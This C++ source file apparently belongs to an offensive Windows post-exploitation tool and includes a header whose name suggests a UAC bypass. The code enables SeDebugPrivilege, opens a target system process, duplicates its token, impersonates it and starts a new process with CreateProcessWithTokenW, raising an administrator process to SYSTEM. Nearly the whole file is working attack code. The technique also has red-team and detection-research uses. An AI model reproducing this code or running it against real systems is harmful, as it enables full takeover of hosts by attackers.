#include "impToken.h"
#include "idAcq.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <sddl.h>

#include "bpuac.h"
#include "checkPrivs.h"


/*
 *
 * Responsible for elevating the current process tokens given admin rights
 *
 */

namespace core {
    bool Fail(const char* msg) {
        printf("[!] %s  failed with error: %lu\n" , msg,  GetLastError());
        return false;
    }

    bool SetSystemPrivs(DWORD pID) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pID);
        if (!hProcess) return Fail("OpenProcess");

        HANDLE hToken = nullptr;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            CloseHandle(hProcess);
            return Fail("OpenProcessToken");
        }

        HANDLE hDupToken = nullptr;
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr,
                              SecurityImpersonation, TokenImpersonation, &hDupToken)) {
            CloseHandle(hToken); CloseHandle(hProcess);
            return Fail("DuplicateTokenEx (imp)");
                              }


        HANDLE hPrimaryToken = nullptr;
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr,
                              SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
            CloseHandle(hDupToken); CloseHandle(hToken); CloseHandle(hProcess);
            return Fail("DuplicateTokenEx (primary)");
                              }

        if (!ImpersonateLoggedOnUser(hDupToken)) {
            CloseHandle(hPrimaryToken); CloseHandle(hDupToken);
            CloseHandle(hToken); CloseHandle(hProcess);
            return Fail("ImpersonateLoggedOnUser");
        }

        std::wstring cmd = core::BuildCmd();
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};

        CreateProcessWithTokenW(hPrimaryToken, 0, cmd.c_str(), nullptr,
                        CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hPrimaryToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        //CloseHandle(hDupToken);
        return true;
    }


    // Helper function to set privileges
    bool SetPrivilege(const HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
        TOKEN_PRIVILEGES tp;
        LUID luid;

        if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) return FALSE;

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL,
                                   (PDWORD) NULL)) return FALSE;
        return (GetLastError() == ERROR_SUCCESS);
    }
    bool getSEDebug() {
        HANDLE hToken;
        // Open current process token
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            // Enable SeDebugPrivilege
            if (SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
                std::cout << "[*] SeDebugPrivilege enabled successfully." << std::endl;
                CloseHandle(hToken);
                return true;
            }else {
                std::cout << "[!] SeDebugPrivilege failed." << std::endl;
                CloseHandle(hToken);
                return false;
            }

        }
        return true;
    }

    bool getSystemPrivs(const std::wstring& targetProcess) {
        DWORD pID = GetProcessID(targetProcess);
        if (SetSystemPrivs(pID)) {
            std::cout << "[*] SetSystemPrivilege successfully." << std::endl;
            if (core::IsSystem()) {
                std::cout << "[*] Process is system" << std::endl;
                return true;
            }else {
                std::cout << "[!] Process is not system." << std::endl;
                return false;
            }

        }else {
            std::cout << "[!] SetSystemPrivilege failed." << std::endl;
            return false;
        }
    }
} // core
